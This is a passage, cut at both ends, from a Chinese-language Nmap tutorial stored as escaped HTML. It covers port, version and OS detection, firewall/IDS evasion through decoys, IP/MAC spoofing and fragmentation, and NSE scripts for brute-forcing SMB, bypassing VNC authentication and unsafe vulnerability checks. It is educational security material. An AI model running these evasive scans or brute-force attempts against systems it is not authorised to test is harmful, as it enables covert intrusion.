INIT/Cookie-ECHO方式是来探测SCTP的端口开放情况；使用IP protocol方式来探测目标主机支持的协议类型(tcp/udp/icmp/sctp等等)；使用idle scan方式借助僵尸主机来扫描目标主机，以达到隐蔽自己的目的；或者使用FTP bounce scan，借助FTP允许的代理服务扫描其他的主机，同样达到隐蔽自己的目的&lt;/p&gt;\n&lt;h5 id=\&quot;简单扫描nmap-ip\&quot;&gt;简单扫描（nmap ip）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#简单扫描nmap-ip\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;例如： nmap 202.207.236.2这个命令会按照 nmap-services 文件中指定的端口进行扫描，然后列出目标主机开放的端口号，以及端口号上运行的服务。在一次简单扫描中，Nmap会以默认TCP SYN扫描方式进行，仅判断目标端口是否开放，若开放，则列出端口对应的服务名称。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;探测端口开放过程&lt;/strong&gt;：确定主机在线之后，nmap会按照nmap-services文件中的端口号发送TCP SYN报文给主机相应的端口，如果主机回复一个包含TCP SYN、ACK的报文，则说明该端口号开放。nmap会再回复一个TCP RST清除连接复位。下面的截图是nmap是和目标主机的80号端口的探测过程，由此可见，目标主机的22号端口属于开放状态\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/16.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h5 id=\&quot;全面扫描nmap--a-ip\&quot;&gt;全面扫描(nmap -A ip)&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#全面扫描nmap--a-ip\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;进攻式扫描（慎用）&lt;/p&gt;\n&lt;p&gt;例如：nmap -A 202.207.236.2 这个命令不仅列出目标主机开放的端口号，对应的服务，还较为详细的列出了服务的版本，其支持的命令,到达目标主机的每一跳路由等信息。在进行完全扫描时，扫描机与目标主机之间存在大量的数据流量交互，扫描时长随之增加。完全扫描不仅仅是TCP协议上的通信交互，还有例如ICMP、HTTP、NBSS、TDS、POP等等协议的交互，这些协议的交互是因为在完全扫描开始时首先对目标主机的开放端口进行了确认，之后再根据不同对应的不同服务进行服务版本信息探测、账户信息等信息的探测！\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/15.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n全面扫描时数据流量包的截图，确定了哪些端口的协议开启了之后，进行更加深入的探测！\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/17.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h5 id=\&quot;探测指定端口的开放状态\&quot;&gt;探测指定端口的开放状态&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#探测指定端口的开放状态\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -p 80-445 10.96.10.246 扫描目标主机的80-445端口的开放情况&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -sS -sU --top-ports 100 10.96.10.246 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;参数-sS表示使用TCP SYN方式扫描TCP端口；-sU表示扫描UDP端口；—top-ports 100表示扫描最有可能开放的100个端口（TCP和UDP分别100个端口）。&lt;/p&gt;\n&lt;h3 id=\&quot;723-版本侦测\&quot;&gt;7.2.3 版本侦测&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#723-版本侦测\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;版本侦测，用于确定目标主机开放端口上运行的具体的应用程序及版本信息。&lt;/p&gt;\n&lt;p&gt;Nmap提供的版本侦测具有如下的优点：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;高速。并行地进行套接字操作，实现一组高效的探测匹配定义语法。&lt;/li&gt;\n&lt;li&gt;尽可能地确定应用名字与版本名字。&lt;/li&gt;\n&lt;li&gt;支持TCP/UDP协议，支持文本格式与二进制格式。&lt;/li&gt;\n&lt;li&gt;支持多种平台服务的侦测，包括Linux/Windows/Mac OS/FreeBSD等系统。&lt;/li&gt;\n&lt;li&gt;如果检测到SSL，会调用openSSL继续侦测运行在SSL上的具体协议（如HTTPS/POP3S/IMAPS）。&lt;/li&gt;\n&lt;li&gt;如果检测到SunRPC服务，那么会调用brute-force RPC grinder进一步确定RPC程序编号、名字、版本号。&lt;/li&gt;\n&lt;li&gt;支持完整的IPv6功能，包括TCP/UDP，基于TCP的SSL。&lt;/li&gt;\n&lt;li&gt;通用平台枚举功能（CPE）&lt;/li&gt;\n&lt;li&gt;广泛的应用程序数据库（nmap-services-probes）。目前Nmap可以识别几千种服务的签名，包含了180多种不同的协议。&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h5 id=\&quot;原理-1\&quot;&gt;原理&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#原理-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;本侦测主要分为以下几个步骤：&lt;/p&gt;\n&lt;p&gt;首先检查open与open|filtered状态的端口是否在排除端口列表内。如果在排除列表，将该端口剔除。&lt;/p&gt;\n&lt;p&gt;如果是TCP端口，尝试建立TCP连接。尝试等待片刻（通常6秒或更多，具体时间可以查询文件nmap-services-probes中Probe TCP NULL q||对应的totalwaitms）。&lt;/p&gt;\n&lt;p&gt;通常在等待时间内，会接收到目标机发送的“WelcomeBanner”信息。nmap将接收到的Banner与nmap-services-probes中NULL probe中的签名进行对比。查找对应应用程序的名字与版本信息。&lt;/p&gt;\n&lt;p&gt;如果通过“Welcome Banner”无法确定应用程序版本，那么nmap再尝试发送其他的探测包（即从nmap-services-probes中挑选合适的probe），将probe得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印出应用返回报文，让用户自行进一步判定。&lt;/p&gt;\n&lt;p&gt;如果是UDP端口，那么直接使用nmap-services-probes中探测包进行探测匹配。根据结果对比分析出UDP应用服务类型。&lt;/p&gt;\n&lt;p&gt;如果探测到应用程序是SSL，那么调用openSSL进一步的侦查运行在SSL之上的具体的应用类型。&lt;/p&gt;\n&lt;p&gt;如果探测到应用程序是SunRPC，那么调用brute-force RPC grinder进一步探测具体服务。&lt;/p&gt;\n&lt;h5 id=\&quot;用法\&quot;&gt;用法&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#用法\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;比如目标主机把SSH的22号端口改成了2222端口，那么如果使用普通扫描只会发现2222端口是开启的，并不能知道2222号端口上运行的程序，通过加参数  -sV  进行版本扫描，可以探测到目标主机上2222端口运行的是SSH服务&lt;/p&gt;\n&lt;p&gt;-sV: 指定让Nmap进行版本侦测&lt;/p&gt;\n&lt;p&gt;—version-intensity &amp;#x3C;level&gt;: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。&lt;/p&gt;\n&lt;p&gt;—version-light: 指定使用轻量侦测方式 (intensity 2)&lt;/p&gt;\n&lt;p&gt;—version-all: 尝试使用所有的probes进行侦测 (intensity 9)&lt;/p&gt;\n&lt;p&gt;—version-trace: 显示出详细的版本侦测过程信息&lt;/p&gt;\n&lt;h3 id=\&quot;724-os侦测\&quot;&gt;7.2.4 OS侦测&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#724-os侦测\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h5 id=\&quot;原理-2\&quot;&gt;原理&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#原理-2\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;Nmap使用TCP/IP协议栈指纹来识别不同的操作系统和设备。在RFC规范中，有些地方对TCP/IP的实现并没有强制规定，由此不同的TCP/IP方案中可能都有自己的特定方式。Nmap主要是根据这些细节上的差异来判断操作系统的类型的。&lt;/p&gt;\n&lt;p&gt;协议栈指纹识别是一项强大的技术，能够以很高的概率迅速确定操作系统的版本。虽然TCP/IP协议栈的定义已经成为一项标准，但是各个厂家，如微软和RedHat等在编写自己的TCP/IP协议栈时，却做出了不同的解释。这些解释因具有独一无二的特性，故被称为“指纹”。通过这些细微的差别，可以准确定位操作系统的版本&lt;/p&gt;\n&lt;p&gt;具体实现方式如下：&lt;/p&gt;\n&lt;p&gt;Nmap内部包含了2600多已知系统的指纹特征（在文件nmap-os-db文件中）。将此指纹数据库作为进行指纹对比的样本库。&lt;/p&gt;\n&lt;p&gt;分别挑选一个open和closed的端口，向其发送经过精心设计的TCP/UDP/ICMP数据包，根据返回的数据包生成一份系统指纹。&lt;/p&gt;\n&lt;p&gt;将探测生成的指纹与nmap-os-db中指纹进行对比，查找匹配的系统。如果无法匹配，以概率形式列举出可能的系统。&lt;/p&gt;\n&lt;h5 id=\&quot;用法-1\&quot;&gt;用法&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#用法-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;-O: 指定Nmap进行OS侦测。&lt;/p&gt;\n&lt;p&gt;—osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）。&lt;/p&gt;\n&lt;p&gt;—osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统\n例：\n&lt;code&gt;nmap -O 10.96.10.246&lt;/code&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;73-nmap高级功能\&quot;&gt;7.3 nmap高级功能&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#73-nmap高级功能\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;防火墙与IDS规避为用于绕开防火墙与IDS的检测与屏蔽，以便能够更加详细地发现目标主机的状况。nmap提供了多种规避技巧通常可以从两个方面考虑规避方式：数据包的变换(Packet Change)和时序变换(Timing Change)&lt;/p&gt;\n&lt;h3 id=\&quot;731-防火墙ids规避\&quot;&gt;7.3.1 防火墙/IDS规避&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#731-防火墙ids规避\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;分片\n将可疑的探测包进行分片处理(例如将TCP包拆分成多个IP包发送过去)，某些简单的防火墙为了加快处理速度可能不会进行重组检查，以此避开其检查&lt;/li&gt;\n&lt;li&gt;IP诱骗(IP decoys)\n在进行扫描时，将真实IP地址在和其他主机的IP地址混合使用(其他主机需要在线，否则目标主机将回复大量数据包到不存在的数主机，从而实质构成了DOS攻击)，以此让目标主机的防火墙或IDS追踪大量的不同IP地址的数据包，降低其追查到自身的概率。但是，某些高级的IDS系统通过统计分析仍然可以追踪出扫描者真实的IP地址&lt;/li&gt;\n&lt;li&gt;IP伪装\nIP伪装就是将自己发送的数据包中的IP地址伪装成其他主机的地址，从而目标机认为是其他主机与之通信。需要注意的是，如果希望接收到目标主机的回复包，那么伪装的IP需要位于统一局域网内。另外，如果既希望隐蔽自己的IP地址，又希望收到目标主机的回复包，那么可以尝试使用idle scan 或匿名代理等网络技术&lt;/li&gt;\n&lt;li&gt;指定源端口\n某些目标主机只允许来自特定端口的数据包通过防火墙。例如，FTP服务器的配置为允许源端口为21号的TCP包通过防火墙与FTP服务器通信，但是源端口为其他的数据包被屏蔽。所以，在此类情况下，可以指定数据包的源端口&lt;/li&gt;\n&lt;li&gt;扫描延时\n某些防火墙针对发送过于频繁的数据包会进行严格的侦查，而且某些系统限制错误报文产生的频率。所以，我们可以降低发包的频率和发包延时以此降低目标主机的审查强度&lt;/li&gt;\n&lt;li&gt;其他技术\nnmap还提供其他多种规避技巧，比如指定使用某个网络接口来发送数据包、指定发送包的最小长度、指定发包的MTU、指定TTL、指定伪装的MAC地址，使用错误检查。&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-f; --mtu &amp;#x26;lt;val&amp;#x26;gt;: 指定使用分片、指定数据包的 MTU.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-D &amp;#x26;lt;decoy1,decoy2\\[,ME\\],...&amp;#x26;gt;: 用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-S &amp;#x26;lt;IP_Address&amp;#x26;gt;: 伪装成其他 IP 地址&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-e &amp;#x26;lt;iface&amp;#x26;gt;: 使用特定的网络接口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-g/--source-port &amp;#x26;lt;portnum&amp;#x26;gt;: 使用指定源端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;--data-length &amp;#x26;lt;num&amp;#x26;gt;: 填充随机数据让数据包长度达到 Num。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;--ip-options &amp;#x26;lt;options&amp;#x26;gt;: 使用指定的 IP 选项来发送数据包。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;--ttl &amp;#x26;lt;val&amp;#x26;gt;: 设置 time-to-live 时间。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;--spoof-mac &amp;#x26;lt;mac address/prefix/vendor name&amp;#x26;gt;: 伪装 MAC 地址&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;--badsum: 使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或 IDS/IPS）&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;示例：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -F -Pn -D 10.96.10.100,10.96.10.110,ME -e eth0 -g 5555 202.207.236.3&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;-F参数表示快速扫描100个端口，-Pn不进行ping扫描，-D表示使用ip诱骗方式掩饰真实ip，使用的是10.96.10.100和10.96.10.110，ME表示自己真实的ip，这里是10.96.10.234，-e 参数指定eth0网卡发送数据包，-g参数指定发送的端口号&lt;/p&gt;\n&lt;h3 id=\&quot;nse脚本引擎\&quot;&gt;NSE脚本引擎&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#nse脚本引擎\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;NSE脚本引擎(Nmap Scripting Engine)是nmap最强大，最灵活的功能之一，允许用户自己编写脚本来执行自动化的操作或者扩展nmap的功能。&lt;/p&gt;\n&lt;p&gt;nmap的脚本库的路径：/usr/share/nmap/scripts或/xx/nmap/scripts/ ，该目录下的文件都是nse脚本&lt;/p&gt;\n&lt;p&gt;NSE使用Lua脚本语言，并且默认提供了丰富的脚本库，目前已经包含了14个类别的350多个脚本。NSE的设计初衷主要考虑以下几个方面:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;网络发现（Network Discovery）&lt;/li&gt;\n&lt;li&gt;更加复杂的版本侦测（例如 skype 软件）&lt;/li&gt;\n&lt;li&gt;漏洞侦测(Vulnerability Detection)&lt;/li&gt;\n&lt;li&gt;后门侦测(Backdoor Detection)&lt;/li&gt;\n&lt;li&gt;漏洞利用(Vulnerability Exploitation)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h5 id=\&quot;分类扫描\&quot;&gt;分类扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#分类扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;Nmap的脚本主要分为以下几类：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;auth: 负责处理鉴权证书（绕开鉴权）的脚本&lt;/li&gt;\n&lt;li&gt;broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务&lt;/li&gt;\n&lt;li&gt;brute: 提供暴力破解方式，针对常见的应用如http/snmp等&lt;/li&gt;\n&lt;li&gt;default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力&lt;/li&gt;\n&lt;li&gt;discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等&lt;/li&gt;\n&lt;li&gt;dos: 用于进行拒绝服务攻击&lt;/li&gt;\n&lt;li&gt;exploit: 利用已知的漏洞入侵系统&lt;/li&gt;\n&lt;li&gt;external: 利用第三方的数据库或资源，例如进行whois解析&lt;/li&gt;\n&lt;li&gt;fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽&lt;/li&gt;\n&lt;li&gt;malware: 探测目标机是否感染了病毒、开启了后门等信息&lt;/li&gt;\n&lt;li&gt;safe: 此类与intrusive相反，属于安全性脚本&lt;/li&gt;\n&lt;li&gt;version: 负责增强服务与版本扫描（Version Detection）功能的脚本&lt;/li&gt;\n&lt;li&gt;vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067\n&lt;strong&gt;示例：&lt;/strong&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=auth 192.168.137.\\* 负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/18.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script-brute 192.168.1.1 #nmap可对数据库、SMB、SNMP等进行简单密码的暴力破解&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/19.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=default 192.168.137.\\* 或者 nmap -sC 192.168.137.\\*&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/20.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script-vuln 192.168.1.1 #扫描是否有常见漏洞&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/21.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -n -p445 --script=broadcast 192.168.137.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;在局域网内探查更多服务开启状况\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/22.jpg&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script external 202.103.243.110&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;利用第三方的数据库或资源，例如进行whois解析&lt;/p&gt;\n&lt;h5 id=\&quot;应用扫描\&quot;&gt;应用扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#应用扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;ul&gt;\n&lt;li&gt;vnc扫描&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=realvnc-auth-bypass 192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 检查vnc认证方式&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=vnc-auth  192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 获取vnc信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=vnc-info 192.168.137.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;smb扫描&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=smb-brute.nse 192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# smb字典破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap  --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 